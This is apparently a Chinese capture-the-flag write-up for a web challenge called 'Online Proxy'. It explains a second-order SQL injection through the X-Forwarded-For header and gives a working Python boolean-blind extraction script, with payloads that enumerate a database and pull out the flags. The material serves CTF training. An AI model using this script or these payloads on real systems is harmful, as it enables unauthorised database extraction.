![[Pasted image 20230219102937.png|500]]

```
/
```

```
欢迎使用 Online Proxy。使用方法为 /?url=，例如 /?url=https://baidu.com/。  
为了保障您的使用体验，我们可能收集您的使用信息，这些信息只会被用于提升我们的服务，请您放心。
```

```
/?url=https://baidu.com/
```

![[Pasted image 20230219103145.png|800]]

![[Pasted image 20230219103535.png|500]]

响应包的结尾出现了奇怪的东西

显示的是内网地址，推测可以通过`X-Forwarded-For`头控制回显

```http
X-Forwarded-For: php_wa_saikou!
```

![[Pasted image 20230219103842.png|500]]

```http
X-Forwarded-For: aba
```

![[Pasted image 20230219105717.png|500]]

这里看wp说是存在二次注入，后台维护一对`currentIp`和`lastIp`，每次访问`ip`和最近一次不同就往后推，并且插入数据库

1. 令第一次`XFF`内容为`sql`注入文本，经过转义后作为`currentIp`
2. 令第二次`XFF`内容为不同的文本，使得未转义的`currentIp`作为`lastIp`拼接成查询
3. 令第三次`XFF`内容与第二次相同，则`lastIp`的值回显

```python
import requests
import time
from sys import stdout

url = 'http://node4.buuoj.cn:29528/'

payloads = ["0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata), {}, 1)) > {}) or '0", 'z', 'z']

success = lambda response: 'Last Ip: 1' in response.text

index = 0
while True:
    session = requests.sessions.Session()
    index += 1
    left = 0
    right = 127
    while left < right:
        time.sleep(0.3)
        mid = (left + right) // 2
        response = [
            session.get(
                url, headers={'X-Forwarded-For': payload.format(index, mid)})
            for payload in payloads
        ][-1]
        if success(response): # mid < nth_char
            left = mid + 1
        else:
            right = mid
    print(chr(left), end='')
    stdout.flush()
```

```
information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e
```

```
0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'), {}, 1)) > {}) or '0
```

```
F4l9_t4b1e
```

```
0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'), {}, 1)) > {}) or '0
```

```
F4l9_C01uMn
```

```
0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e), {}, 1)) > {}) or '0
```

```
flag{G1zj1n_W4nt5_4_91r1_Fr1end},flag{527fe9cc-7ec6-4a39-92dd-7650feb095ca}
```

#Web #HTTP #Header #xff #SQL注入 #二次注入 #布尔盲注 